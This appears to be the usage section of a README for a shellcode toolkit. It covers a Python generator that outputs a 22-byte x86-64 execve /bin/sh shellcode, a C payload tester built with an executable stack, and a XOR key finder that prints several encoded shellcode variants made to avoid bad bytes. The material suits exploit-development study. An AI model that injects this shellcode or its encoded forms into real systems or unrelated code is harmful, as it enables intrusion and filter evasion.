# Usage

## The shellcode python generator

It uses the simplest "execve /bin/sh" shellcode by default

```bash
python3 generate_shellcode.py

Shellcode: b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
Shellcode HEX: 31f65648bb2f62696e2f2f736853545ff7eeb03b0f05
Raw Shellcode: \x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05
Shellcode Length: 22 bytes
```

## The C payload tester

### Compilation
`gcc -o test_payload test_payload.c -z execstack`

### Run
```bash
./test_payload               

$ id
uid=1000(xtk)...
```

## The XOR key finder

This script helps to avoid specified badbytes by static XOR key encoding. 
It looks for appropriate XOR key to fit specified badbytes

```bash
$ python3 xor_key_finder.py

Found valid XOR key: 0x0d
Encoded shellcode:
\x3c\xfb\x5b\x45\xb6\x22\x6f\x64\x63\x22\x22\x7e\x65\x5e\x59\x52\xfa\xe3\xbd\x36\x02\x08
0x3c,0xfb,0x5b,0x45,0xb6,0x22,0x6f,0x64,0x63,0x22,0x22,0x7e,0x65,0x5e,0x59,0x52,0xfa,0xe3,0xbd,0x36,0x02,0x08
3cfb5b45b6226f646322227e655e5952fae3bd360208

Found valid XOR key: 0x10
Encoded shellcode:
\x21\xe6\x46\x58\xab\x3f\x72\x79\x7e\x3f\x3f\x63\x78\x43\x44\x4f\xe7\xfe\xa0\x2b\x1f\x15
0x21,0xe6,0x46,0x58,0xab,0x3f,0x72,0x79,0x7e,0x3f,0x3f,0x63,0x78,0x43,0x44,0x4f,0xe7,0xfe,0xa0,0x2b,0x1f,0x15
21e64658ab3f72797e3f3f637843444fe7fea02b1f15

Found valid XOR key: 0x13
Encoded shellcode:
\x22\xe5\x45\x5b\xa8\x3c\x71\x7a\x7d\x3c\x3c\x60\x7b\x40\x47\x4c\xe4\xfd\xa3\x28\x1c\x16
0x22,0xe5,0x45,0x5b,0xa8,0x3c,0x71,0x7a,0x7d,0x3c,0x3c,0x60,0x7b,0x40,0x47,0x4c,0xe4,0xfd,0xa3,0x28,0x1c,0x16
22e5455ba83c717a7d3c3c607b40474ce4fda3281c16

Found valid XOR key: 0x16
Encoded shellcode:
\x27\xe0\x40\x5e\xad\x39\x74\x7f\x78\x39\x39\x65\x7e\x45\x42\x49\xe1\xf8\xa6\x2d\x19\x13
0x27,0xe0,0x40,0x5e,0xad,0x39,0x74,0x7f,0x78,0x39,0x39,0x65,0x7e,0x45,0x42,0x49,0xe1,0xf8,0xa6,0x2d,0x19,0x13
27e0405ead39747f783939657e454249e1f8a62d1913
...
```
